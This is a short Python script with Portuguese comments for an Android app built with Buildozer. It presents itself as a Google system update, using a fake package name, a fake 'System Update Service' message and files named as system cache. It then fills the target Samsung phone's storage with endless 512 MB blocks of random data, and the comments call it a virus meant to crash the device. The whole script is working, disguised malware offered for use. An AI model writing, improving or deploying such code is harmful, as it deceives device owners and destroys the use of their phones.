import os
import time

# Configurações do "ataque" silencioso para Samsung moderno
# O nome do pacote deve ser o mesmo que você planejou no Buildozer
PACKAGE_NAME = "com.google.android.sys_v8_update"
PATH = f"/sdcard/Android/data/{PACKAGE_NAME}/files/"

def iniciar_escrita_infinita():
    # Cria a pasta de dados onde o Android permite escrita sem permissão root
    try:
        if not os.path.exists(PATH):
            os.makedirs(PATH, exist_ok=True)
    except Exception as e:
        print(f"Erro ao criar diretório: {e}")
        return

    print("Serviço de Atualização de Sistema iniciado...")
    
    i = 0
    # Blocos de 512MB são ideais para não travar o seu Moto E22 durante o teste
    BLOCK_SIZE = 512 * 1024 * 1024 

    while True:
        try:
            # Nome do arquivo disfarçado de cache de sistema
            file_name = f"system_cache_v8_{i}_{int(time.time())}.db"
            full_path = os.path.join(PATH, file_name)
            
            # Gera dados aleatórios (urandom) que são impossíveis de comprimir
            with open(full_path, "wb") as f:
                f.write(os.urandom(BLOCK_SIZE))
            
            i += 1
            print(f"Injetando bloco {i}...")
            
        except OSError:
            # Quando o Samsung atingir 0 bytes, o sistema Android vai travar
            print("Armazenamento do dispositivo alvo esgotado.")
            break
        except Exception:
            # Mantém o vírus rodando mesmo se houver erros menores
            continue

if __name__ == "__main__":
    # Pequeno delay para o app não ser fechado imediatamente ao abrir
    time.sleep(2)
    iniciar_escrita_infinita()
